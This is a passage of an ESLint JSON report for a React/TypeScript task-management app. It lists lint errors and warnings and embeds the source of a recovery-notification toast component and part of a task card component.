\"use\".","line":315,"column":30,"nodeType":"Identifier","endLine":315,"endColumn":41},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_RecoveryNotificationManager: React.FC<RecoveryNotificationManagerProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":320,"column":29,"nodeType":"Identifier","endLine":320,"endColumn":40},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":322,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":322,"endColumn":18,"suggestions":[{"fix":{"range":[10627,10703],"text":""},"messageId":"removeConsole","data":{"propertyName":"debug"},"desc":"Remove the console.debug()."}]},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useEffect\" is called in function \"_RecoveryNotificationManager: React.FC<RecoveryNotificationManagerProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":346,"column":3,"nodeType":"Identifier","endLine":346,"endColumn":12},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":348,"column":16,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":348,"endColumn":19,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[11504,11507],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[11504,11507],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":375,"column":25,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":375,"endColumn":28,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[12606,12609],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[12606,12609],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":399,"column":30,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":399,"endColumn":33,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[13328,13331],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[13328,13331],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":402,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":402,"endColumn":17,"suggestions":[{"fix":{"range":[13387,13479],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]}],"suppressedMessages":[],"errorCount":11,"fatalErrorCount":0,"warningCount":11,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Recovery Notification Component (2025)\n * \n * Provides user-friendly notifications for recovery operations,\n * crash detection, and state restoration activities.\n * \n * Features:\n * - Animated toast notifications\n * - Progress indicators for recovery operations\n * - Interactive recovery options\n * - Accessibility support\n * - Auto-dismiss with manual override\n */\n\nimport React, { useState, useEffect, useCallback } from 'react';\nimport { motion, AnimatePresence } from 'framer-motion';\nimport { \n  CheckCircle, \n  AlertTriangle, \n  XCircle, \n  Clock, \n  RefreshCw, \n  X, \n  Download, \n  Eye, \n  Settings,\n  Shield\n} from 'lucide-react';\n\n// Notification types\nexport type NotificationType = 'success' | 'warning' | 'error' | 'info' | 'recovery';\n\n// Notification data structure\nexport interface RecoveryNotificationData {\n  id: string;\n  type: NotificationType;\n  title: string;\n  message: string;\n  timestamp: number;\n  duration?: number; // Auto-dismiss time in ms (0 = manual dismiss only)\n  persistent?: boolean; // Don't auto-dismiss\n  actions?: NotificationAction[];\n  progress?: number; // 0-100 for progress notifications\n  metadata?: Record<string, any>;\n}\n\n// Action button configuration\nexport interface NotificationAction {\n  id: string;\n  label: string;\n  variant: 'primary' | 'secondary' | 'destructive';\n  icon?: React.ComponentType<{ size?: number }>;\n  onClick: () => void | Promise<void>;\n  loading?: boolean;\n}\n\n// Notification component props\nexport interface RecoveryNotificationProps {\n  notification: RecoveryNotificationData;\n  onDismiss: (id: string) => void;\n  onActionClick: (notificationId: string, actionId: string) => void;\n}\n\n// Notification manager props\nexport interface RecoveryNotificationManagerProps {\n  maxNotifications?: number;\n  defaultDuration?: number;\n  position?: 'top-right' | 'top-left' | 'bottom-right' | 'bottom-left' | 'top-center';\n  className?: string;\n}\n\n/**\n * Individual notification component\n */\nexport const _RecoveryNotification: React.FC<RecoveryNotificationProps> = ({\n  notification,\n  onDismiss,\n  onActionClick\n}) => {\n  const [isVisible, setIsVisible] = useState(true);\n  const [actionLoading, setActionLoading] = useState<Record<string, boolean>>({});\n\n  // Auto-dismiss timer\n  useEffect(() => {\n    if (!notification.persistent && notification.duration && notification.duration > 0) {\n      const timer = setTimeout(() => {\n        handleDismiss();\n      }, notification.duration);\n\n      return () => clearTimeout(timer);\n    }\n  }, [notification.duration, notification.persistent]);\n\n  const handleDismiss = useCallback(() => {\n    setIsVisible(false);\n    // Delay actual dismissal to allow exit animation\n    setTimeout(() => {\n      onDismiss(notification.id);\n    }, 300);\n  }, [notification.id, onDismiss]);\n\n  const handleActionClick = useCallback(async (actionId: string) => {\n    const action = notification.actions?.find(a => a.id === actionId);\n    if (!action) return;\n\n    setActionLoading(prev => ({ ...prev, [actionId]: true }));\n\n    try {\n      await action.onClick();\n      onActionClick(notification.id, actionId);\n    } catch (error) {\n      console.error('Notification action failed:', error);\n    } finally {\n      setActionLoading(prev => ({ ...prev, [actionId]: false }));\n    }\n  }, [notification.actions, notification.id, onActionClick]);\n\n  // Get notification styling based on type\n  const getNotificationStyles = () => {\n    const baseStyles = \"relative overflow-hidden bg-card border shadow-lg rounded-lg\";\n    \n    switch (notification.type) {\n      case 'success':\n        return `${baseStyles} border-green-200 bg-green-50`;\n      case 'warning':\n        return `${baseStyles} border-yellow-200 bg-yellow-50`;\n      case 'error':\n        return `${baseStyles} border-red-200 bg-red-50`;\n      case 'recovery':\n        return `${baseStyles} border-blue-200 bg-blue-50`;\n      default:\n        return `${baseStyles} border-border`;\n    }\n  };\n\n  // Get icon for notification type\n  const getIcon = () => {\n    const iconProps = { size: 20 };\n    \n    switch (notification.type) {\n      case 'success':\n        return <CheckCircle {...iconProps} className=\"text-green-600\" />;\n      case 'warning':\n        return <AlertTriangle {...iconProps} className=\"text-yellow-600\" />;\n      case 'error':\n        return <XCircle {...iconProps} className=\"text-red-600\" />;\n      case 'recovery':\n        return <Shield {...iconProps} className=\"text-blue-600\" />;\n      default:\n        return <Clock {...iconProps} className=\"text-muted-foreground\" />;\n    }\n  };\n\n  // Format timestamp\n  const formatTime = (timestamp: number) => {\n    const now = Date.now();\n    const diff = now - timestamp;\n    const minutes = Math.floor(diff / 60000);\n    const seconds = Math.floor(diff / 1000);\n\n    if (minutes > 0) return `${minutes}m ago`;\n    if (seconds > 0) return `${seconds}s ago`;\n    return 'Just now';\n  };\n\n  if (!isVisible) return null;\n\n  return (\n    <motion.div\n      initial={{ opacity: 0, x: 300, scale: 0.8 }}\n      animate={{ opacity: 1, x: 0, scale: 1 }}\n      exit={{ opacity: 0, x: 300, scale: 0.8 }}\n      transition={{ type: \"spring\", damping: 25, stiffness: 300 }}\n      className={getNotificationStyles()}\n      style={{ width: '400px', maxWidth: '90vw' }}\n    >\n      {/* Progress bar for recovery operations */}\n      {typeof notification.progress === 'number' && (\n        <div className=\"absolute top-0 left-0 right-0 h-1 bg-muted\">\n          <motion.div\n            initial={{ width: 0 }}\n            animate={{ width: `${notification.progress}%` }}\n            className=\"h-full bg-primary transition-all duration-300\"\n          />\n        </div>\n      )}\n\n      <div className=\"p-4\">\n        <div className=\"flex items-start gap-3\">\n          {/* Icon */}\n          <div className=\"flex-shrink-0 mt-0.5\">\n            {getIcon()}\n          </div>\n\n          {/* Content */}\n          <div className=\"flex-1 min-w-0\">\n            <div className=\"flex items-start justify-between gap-2\">\n              <div className=\"flex-1\">\n                <h4 className=\"font-medium text-foreground\">\n                  {notification.title}\n                </h4>\n                <p className=\"text-sm text-muted-foreground mt-1\">\n                  {notification.message}\n                </p>\n              </div>\n\n              {/* Dismiss button */}\n              <button\n                onClick={handleDismiss}\n                className=\"flex-shrink-0 p-1 hover:bg-muted rounded transition-colors\"\n                aria-label=\"Dismiss notification\"\n              >\n                <X size={16} className=\"text-muted-foreground\" />\n              </button>\n            </div>\n\n            {/* Progress text for recovery operations */}\n            {typeof notification.progress === 'number' && (\n              <div className=\"mt-2 text-xs text-muted-foreground\">\n                {notification.progress < 100 \n                  ? `Recovery in progress: ${notification.progress}%`\n                  : 'Recovery completed'\n                }\n              </div>\n            )}\n\n            {/* Actions */}\n            {notification.actions && notification.actions.length > 0 && (\n              <div className=\"flex items-center gap-2 mt-3\">\n                {notification.actions.map((action) => (\n                  <button\n                    key={action.id}\n                    onClick={() => handleActionClick(action.id)}\n                    disabled={actionLoading[action.id] || action.loading}\n                    className={`\n                      inline-flex items-center gap-1.5 px-3 py-1.5 rounded text-xs font-medium\n                      transition-colors disabled:opacity-50 disabled:cursor-not-allowed\n                      ${action.variant === 'primary' \n                        ? 'bg-primary text-primary-foreground hover:bg-primary/90'\n                        : action.variant === 'destructive'\n                        ? 'bg-destructive text-destructive-foreground hover:bg-destructive/90'\n                        : 'bg-secondary text-secondary-foreground hover:bg-secondary/90'\n                      }\n                    `}\n                  >\n                    {(actionLoading[action.id] || action.loading) ? (\n                      <motion.div\n                        animate={{ rotate: 360 }}\n                        transition={{ duration: 1, repeat: Infinity, ease: \"linear\" }}\n                      >\n                        <RefreshCw size={12} />\n                      </motion.div>\n                    ) : action.icon ? (\n                      <action.icon size={12} />\n                    ) : null}\n                    {action.label}\n                  </button>\n                ))}\n              </div>\n            )}\n\n            {/* Timestamp */}\n            <div className=\"mt-2 text-xs text-muted-foreground\">\n              {formatTime(notification.timestamp)}\n            </div>\n          </div>\n        </div>\n      </div>\n    </motion.div>\n  );\n};\n\n/**\n * Notification manager component\n */\nexport const _RecoveryNotificationManager: React.FC<RecoveryNotificationManagerProps> = ({\n  maxNotifications = 5,\n  defaultDuration = 5000,\n  position = 'top-right',\n  className = ''\n}) => {\n  const [notifications, setNotifications] = useState<RecoveryNotificationData[]>([]);\n\n  // Add notification method (exposed via ref or context)\n  const addNotification = useCallback((\n    notification: Omit<RecoveryNotificationData, 'id' | 'timestamp'>\n  ) => {\n    const newNotification: RecoveryNotificationData = {\n      ...notification,\n      id: `notification_${Date.now()}_${Math.random().toString(36).substring(2)}`,\n      timestamp: Date.now(),\n      duration: notification.duration ?? defaultDuration\n    };\n\n    setNotifications(prev => {\n      const updated = [newNotification, ...prev];\n      return updated.slice(0, maxNotifications);\n    });\n\n    return newNotification.id;\n  }, [defaultDuration, maxNotifications]);\n\n  // Update notification (for progress updates)\n  const updateNotification = useCallback((id: string, updates: Partial<RecoveryNotificationData>) => {\n    setNotifications(prev => \n      prev.map(notification => \n        notification.id === id \n          ? { ...notification, ...updates }\n          : notification\n      )\n    );\n  }, []);\n\n  // Remove notification\n  const removeNotification = useCallback((id: string) => {\n    setNotifications(prev => prev.filter(n => n.id !== id));\n  }, []);\n\n  // Handle action clicks\n  const handleActionClick = useCallback((notificationId: string, actionId: string) => {\n    // Could emit events or handle specific actions here\n    console.debug('Notification action clicked:', { notificationId, actionId });\n  }, []);\n\n  // Position styles\n  const getPositionStyles = () => {\n    const baseStyles = \"fixed z-50 pointer-events-none\";\n    \n    switch (position) {\n      case 'top-right':\n        return `${baseStyles} top-4 right-4`;\n      case 'top-left':\n        return `${baseStyles} top-4 left-4`;\n      case 'bottom-right':\n        return `${baseStyles} bottom-4 right-4`;\n      case 'bottom-left':\n        return `${baseStyles} bottom-4 left-4`;\n      case 'top-center':\n        return `${baseStyles} top-4 left-1/2 transform -translate-x-1/2`;\n      default:\n        return `${baseStyles} top-4 right-4`;\n    }\n  };\n\n  // Expose methods via global context or window object for external use\n  useEffect(() => {\n    // In a real implementation, you'd use a context provider or global state\n    (window as any).recoveryNotificationManager = {\n      addNotification,\n      updateNotification,\n      removeNotification,\n      \n      // Convenience methods for common notification types\n      success: (title: string, message: string, options?: Partial<RecoveryNotificationData>) =>\n        addNotification({ type: 'success', title, message, ...options }),\n      \n      warning: (title: string, message: string, options?: Partial<RecoveryNotificationData>) =>\n        addNotification({ type: 'warning', title, message, ...options }),\n      \n      error: (title: string, message: string, options?: Partial<RecoveryNotificationData>) =>\n        addNotification({ type: 'error', title, message, persistent: true, ...options }),\n      \n      recovery: (title: string, message: string, progress?: number, options?: Partial<RecoveryNotificationData>) =>\n        addNotification({ \n          type: 'recovery', \n          title, \n          message, \n          progress, \n          persistent: progress !== undefined && progress < 100,\n          ...options \n        })\n    };\n\n    return () => {\n      delete (window as any).recoveryNotificationManager;\n    };\n  }, [addNotification, updateNotification, removeNotification]);\n\n  return (\n    <div className={`${getPositionStyles()} ${className}`}>\n      <div className=\"space-y-3 pointer-events-auto\">\n        <AnimatePresence>\n          {notifications.map(notification => (\n            <_RecoveryNotification\n              key={notification.id}\n              notification={notification}\n              onDismiss={removeNotification}\n              onActionClick={handleActionClick}\n            />\n          ))}\n        </AnimatePresence>\n      </div>\n    </div>\n  );\n};\n\n// Convenience hooks for using notifications\nexport const useRecoveryNotifications = () => {\n  const manager = (window as any).recoveryNotificationManager;\n  \n  if (!manager) {\n    console.warn('RecoveryNotificationManager not found. Make sure it is mounted in your app.');\n    return {\n      addNotification: () => '',\n      updateNotification: () => {},\n      removeNotification: () => {},\n      success: () => '',\n      warning: () => '',\n      error: () => '',\n      recovery: () => ''\n    };\n  }\n  \n  return manager;\n};\n\n// Export utility function for creating notification data\nexport const createRecoveryNotification = (\n  type: NotificationType,\n  title: string,\n  message: string,\n  options?: Partial<RecoveryNotificationData>\n): Omit<RecoveryNotificationData, 'id' | 'timestamp'> => ({\n  type,\n  title,\n  message,\n  ...options\n});\n\n\nexport default _RecoveryNotificationManager;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/task/TaskCard.tsx","messages":[{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'Edit3' is defined but never used.","line":15,"column":3,"nodeType":null,"messageId":"unusedVar","endLine":15,"endColumn":8},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'Copy' is defined but never used.","line":16,"column":3,"nodeType":null,"messageId":"unusedVar","endLine":16,"endColumn":7},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'Trash2' is defined but never used.","line":17,"column":3,"nodeType":null,"messageId":"unusedVar","endLine":17,"endColumn":9},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useTaskStore\" is called in function \"_TaskCardComponent\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":40,"column":70,"nodeType":"Identifier","endLine":40,"endColumn":82},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_TaskCardComponent\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":44,"column":47,"nodeType":"Identifier","endLine":44,"endColumn":55},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_TaskCardComponent\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":45,"column":55,"nodeType":"Identifier","endLine":45,"endColumn":63},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_TaskCardComponent\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":46,"column":37,"nodeType":"Identifier","endLine":46,"endColumn":45},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_TaskCardComponent\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":47,"column":29,"nodeType":"Identifier","endLine":47,"endColumn":37},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_TaskCardComponent\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":48,"column":55,"nodeType":"Identifier","endLine":48,"endColumn":63},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_TaskCardComponent\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":49,"column":53,"nodeType":"Identifier","endLine":49,"endColumn":61},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useRef\" is called in function \"_TaskCardComponent\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":52,"column":23,"nodeType":"Identifier","endLine":52,"endColumn":29},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useRef\" is called in function \"_TaskCardComponent\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":53,"column":21,"nodeType":"Identifier","endLine":53,"endColumn":27},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useRef\" is called in function \"_TaskCardComponent\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":54,"column":19,"nodeType":"Identifier","endLine":54,"endColumn":25},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"The 'dropdownItems' array makes the dependencies of useCallback Hook (at line 172) change on every render. To fix this, wrap the initialization of 'dropdownItems' in its own useMemo() Hook.","line":67,"column":9,"nodeType":"VariableDeclarator","endLine":92,"endColumn":4},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_TaskCardComponent\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":95,"column":27,"nodeType":"Identifier","endLine":95,"endColumn":38},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"React Hook useEffect has an unnecessary dependency: 'isDropdownOpen'. Either exclude it or remove the dependency array. Outer scope values like 'isDropdownOpen' aren't valid dependencies because mutating them doesn't re-render the component.","line":108,"column":8,"nodeType":"ArrayExpression","endLine":108,"endColumn":24,"suggestions":[{"desc":"Update the dependencies array to be: []","fix":{"range":[2903,2919],"text":"[]"}}]},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useClickOutside\" is called in function \"_TaskCardComponent\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":111,"column":3,"nodeType":"Identifier","endLine":111,"endColumn":18},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_TaskCardComponent\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":114,"column":30,"nodeType":"Identifier","endLine":114,"endColumn":41},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":125,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":125,"endColumn":20,"suggestions":[{"fix":{"range":[3332,3375],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"React Hook useCallback has a missing dependency: 'statusCycle'. Either include it or remove the dependency array.","line":129,"column":6,"nodeType":"ArrayExpression","endLine":129,"endColumn":40,"suggestions":[{"desc":"Update the dependencies array to be: [statusCycle, task.id, task.status, updateTask]","fix":{"range":[3429,3463],"text":"[statusCycle, task.id, task.status, updateTask]"}}]},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_TaskCardComponent\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":132,"column":27,"nodeType":"Identifier","endLine":132,"endColumn":38},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_TaskCardComponent\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":137,"column":29,"nodeType":"Identifier","endLine":137,"endColumn":40},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_TaskCardComponent\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":145,"column":33,"nodeType":"Identifier","endLine":145,"endColumn":44},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_TaskCardComponent\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":175,"column":32,"nodeType":"Identifier","endLine":175,"endColumn":43},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_TaskCardComponent\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":182,"column":39,"nodeType":"Identifier","endLine":182,"endColumn":50},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_TaskCardComponent\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":192,"column":32,"nodeType":"Identifier","endLine":192,"endColumn":43}],"suppressedMessages":[],"errorCount":19,"fatalErrorCount":0,"warningCount":7,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import React, { useState, useEffect, useRef, useCallback } from 'react'\nimport { motion, AnimatePresence } from 'framer-motion'\nimport { \n  Clock, \n  User, \n  Calendar, \n  CheckCircle2, \n  Circle, \n  AlertTriangle,\n  Target,\n  ChevronRight,\n  ChevronDown,\n  MoreHorizontal,\n  Link2,\n  Edit3,\n  Copy,\n  Trash2,\n  Loader2,\n  AlertCircle\n} from 'lucide-react'\nimport { Task, ContextMenuItem } from '@/types'\nimport { useTaskStore } from '@/store/useTaskStore'\nimport { cn, getPriorityColor, getStatusColor, calculateTaskProgress, formatDate } from '@/lib/utils'\n\ninterface TaskCardProps {\n  task: Task\n  index?: number\n  density?: 'compact' | 'comfortable' | 'spacious'\n  isSelected?: boolean\n  isDraggable?: boolean\n}\n\nconst _TaskCardComponent = ({ \n  task, \n  index = 0, \n  density = 'comfortable',\n  isSelected = false,\n  isDraggable = false\n}: TaskCardProps) => {\n  const { setSelectedTask, updateTask, deleteTask, duplicateTask } = useTaskStore()\n  const progress = calculateTaskProgress(task)\n  \n  // State management\n  const [isDropdownOpen, setIsDropdownOpen] = useState(false)\n  const [isSubtasksExpanded, setIsSubtasksExpanded] = useState(false)\n  const [isLoading, setIsLoading] = useState(false)\n  const [error, setError] = useState<string | null>(null)\n  const [focusedOptionIndex, setFocusedOptionIndex] = useState(-1)\n  const [showDeleteConfirm, setShowDeleteConfirm] = useState(false)\n  \n  // Refs for accessibility and click outside\n  const dropdownRef = useRef<HTMLDivElement>(null)\n  const buttonRef = useRef<HTMLButtonElement>(null)\n  const cardRef = useRef<HTMLElement>(null)\n  \n  // Status cycle mapping\n  const statusCycle: Record<Task['status'], Task['status']> = {\n    'pending': 'in-progress',\n    'in-progress': 'done',\n    'done': 'pending',\n    'review': 'done',\n    'deferred': 'pending',\n    'cancelled': 'pending'\n  }\n\n  // Dropdown menu items\n  const dropdownItems: ContextMenuItem[] = [\n    {\n      id: 'edit',\n      label: 'Edit',\n      action: () => {\n        setSelectedTask(task)\n        setIsDropdownOpen(false)\n      }\n    },\n    {\n      id: 'duplicate',\n      label: 'Duplicate',\n      action: () => {\n        duplicateTask(task.id)\n        setIsDropdownOpen(false)\n      }\n    },\n    {\n      id: 'delete',\n      label: 'Delete',\n      action: () => {\n        setIsDropdownOpen(false)\n        setShowDeleteConfirm(true)\n      }\n    }\n  ]\n\n  // Click outside handler\n  const useClickOutside = useCallback(() => {\n    useEffect(() => {\n      const handleClickOutside = (event: MouseEvent) => {\n        if (dropdownRef.current && !dropdownRef.current.contains(event.target as Node)) {\n          setIsDropdownOpen(false)\n          setFocusedOptionIndex(-1)\n        }\n      }\n\n      if (isDropdownOpen) {\n        document.addEventListener('mousedown', handleClickOutside)\n        return () => document.removeEventListener('mousedown', handleClickOutside)\n      }\n    }, [isDropdownOpen])\n  }, [isDropdownOpen])\n\n  useClickOutside()\n\n  // Status toggle with loading state\n  const handleStatusToggle = useCallback(async (e: React.MouseEvent) => {\n    e.stopPropagation()\n    const newStatus = statusCycle[task.status]\n    \n    setIsLoading(true)\n    setError(null)\n    \n    try {\n      await updateTask(task.id, { status: newStatus })\n    } catch (err) {\n      setError('Failed to update task')\n      console.error('Status update failed:', err)\n    } finally {\n      setIsLoading(false)\n    }\n  }, [task.id, task.status, updateTask])\n\n  // Card click handler\n  const handleCardClick = useCallback(() => {\n    setSelectedTask(task)\n  }, [task, setSelectedTask])\n\n  // Keyboard navigation for card\n  const handleCardKeyDown = useCallback((e: React.KeyboardEvent) => {\n    if (e.key === 'Enter' || e.key === ' ') {\n      e.preventDefault()\n      setSelectedTask(task)\n    }\n  }, [task, setSelectedTask])\n\n  // Dropdown keyboard navigation\n  const handleDropdownKeyDown = useCallback((e: React.KeyboardEvent) => {\n    switch (e.key) {\n      case 'ArrowDown':\n        e.preventDefault()\n        setFocusedOptionIndex((prev) => \n          prev < dropdownItems.length - 1 ? prev + 1 : 0\n        )\n        break\n      case 'ArrowUp':\n        e.preventDefault()\n        setFocusedOptionIndex((prev) => \n          prev > 0 ? prev - 1 : dropdownItems.length - 1\n        )\n        break\n      case 'Enter':\n      case ' ':\n        e.preventDefault()\n        if (focusedOptionIndex >= 0 && dropdownItems[focusedOptionIndex]) {\n          dropdownItems[focusedOptionIndex].action()\n        }\n        break\n      case 'Escape':\n        setIsDropdownOpen(false)\n        setFocusedOptionIndex(-1)\n        buttonRef.current?.focus()\n        break\n    }\n  }, [focusedOptionIndex, dropdownItems])\n\n  // Dropdown toggle\n  const handleDropdownToggle = useCallback((e: React.MouseEvent) => {\n    e.stopPropagation()\n    setIsDropdownOpen(!isDropdownOpen)\n    setFocusedOptionIndex(-1)\n  }, [isDropdownOpen])\n\n  // Dropdown keyboard toggle\n  const handleDropdownButtonKeyDown = useCallback((e: React.KeyboardEvent) => {\n    if (e.key === 'Enter' || e.key === ' ') {\n      e.preventDefault()\n      e.stopPropagation()\n      setIsDropdownOpen(!isDropdownOpen)\n      setFocusedOptionIndex(-1)\n    }\n  }, [isDropdownOpen])\n\n  // Subtasks toggle\n  const handleSubtasksToggle = useCallback((e: React.MouseEvent) => {\n    e.stopPropagation()\n    setIsSubtasksExpanded(!isSubtasksExpanded)\n  }, [isSubtasksExpanded])\n\n  // Priority and status icons\n  const priorityIcon = {\n    high: <AlertTriangle className=\"w-4 h-4\" />,\n    medium: <Target className=\"w-4 h-4\" />,\n    low: <Circle className=\"w-4 h-4\" />\n  }\n\n  const statusIcon = task.status === 'done' ? \n    <CheckCircle2 className=\"w-5 h-5 text-emerald-600\" /> : \n    <Circle className=\"w-5 h-5 text-muted-foreground hover:text-primary transition-colors\" />\n\n  return (\n    <motion.article\n      ref={cardRef}\n      initial={{ opacity: 0, y: 20 }}\n      animate={{ opacity: 1, y: 0 }}\n      transition={{ delay: index * 0.05 }}\n      whileHover={{ \n        y: -2,\n        boxShadow: \"0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04)\"\n      }}\n      className={cn(\n        \"group relative bg-card border border-border/50 rounded-xl overflow-hidden\",\n        \"hover:border-border transition-all duration-300 cursor-pointer focus-within:ring-2 focus-within:ring-primary/20\",\n        \"glass-morphism hover:bg-card/80\",\n        isSelected && \"ring-2 ring-primary/50 bg-primary/5\",\n        density === 'compact' && \"p-3\",\n        density === 'comfortable' && \"p-4\",\n        density === 'spacious' && \"p-6\"\n      )}\n      onClick={handleCardClick}\n      onKeyDown={handleCardKeyDown}\n      tabIndex={0}\n      role=\"article\"\n      aria-label={`Task: ${task.title}`}\n    >\n      {/* Priority stripe */}\n      <div \n        className={cn(\n          \"absolute top-0 left-0 w-1 h-full\",\n          task.priority === 'high' && \"bg-red-500\",\n          task.priority === 'medium' && \"bg-orange-500\",\n          task.priority === 'low' && \"bg-green-500\"\n        )}\n      />\n\n      {/* Drag handle (if draggable) */}\n      {isDraggable && (\n        <div \n          data-testid=\"drag-handle\"\n          className=\"absolute left-2 top-1/2 transform -translate-y-1/2 opacity-0 group-hover:opacity-100 transition-opacity\"\n        >\n          <div className=\"w-1 h-6 bg-muted-foreground/30 rounded-full\"></div>\n        </div>\n      )}\n\n      {/* Header */}\n      <div className=\"flex items-start justify-between mb-3\">\n        <div className=\"flex items-start space-x-3 flex-1 min-w-0\">\n          {/* Status toggle */}\n          <motion.button\n            onClick={handleStatusToggle}\n            className=\"mt-1 flex-shrink-0 relative\"\n            whileHover={{ scale: 1.1 }}\n            whileTap={{ scale: 0.9 }}\n            disabled={isLoading}\n            aria-label={`Toggle status from ${task.status}`}\n          >\n            {isLoading ? (\n              <Loader2 data-testid=\"loading-spinner\" className=\"w-5 h-5 animate-spin text-primary\" />\n            ) : (\n              statusIcon\n            )}\n          </motion.button>\n\n          {/* Task info */}\n          <div className=\"flex-1 min-w-0\">\n            <h3 className={cn(\n              \"font-semibold text-foreground 